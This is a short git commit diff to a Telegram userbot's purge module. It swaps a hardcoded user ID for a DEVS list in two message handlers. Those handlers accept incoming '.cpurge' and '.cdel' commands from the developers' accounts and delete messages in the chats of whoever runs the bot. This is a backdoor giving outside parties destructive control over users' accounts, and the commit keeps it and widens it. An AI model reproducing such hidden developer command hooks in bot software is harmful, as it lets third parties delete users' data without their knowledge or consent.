7753846cf818163d75a8abd3bdead26c44865966
Bdrl <93611653+Yansaii@users.noreply.github.com>
2022-01-19 19:12:44 +0700

    Update purge.py

--- userbot/modules/purge.py
+++ userbot/modules/purge.py
@@ -8,12 +8,12 @@ from asyncio import sleep
 
 from telethon.errors import rpcbaseerrors
 
-from userbot import CMD_HELP
+from userbot import CMD_HELP, DEVS
 from userbot.events import register
 
 
 @register(outgoing=True, pattern=r"^\.purge$")
-@register(incoming=True, from_users=2075505824, pattern=r"^\.cpurge$")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurge$")
 async def fastpurger(purg):
     chat = await purg.get_input_chat()
     msgs = []
@@ -74,7 +74,7 @@ async def purgeme(delme):
 
 
 @register(outgoing=True, pattern=r"^\.del$")
-@register(incoming=True, from_users=2075505824, pattern=r"^\.cdel$")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cdel$")
 async def delete_it(delme):
     msg_src = await delme.get_reply_message()
     if delme.reply_to_msg_id:
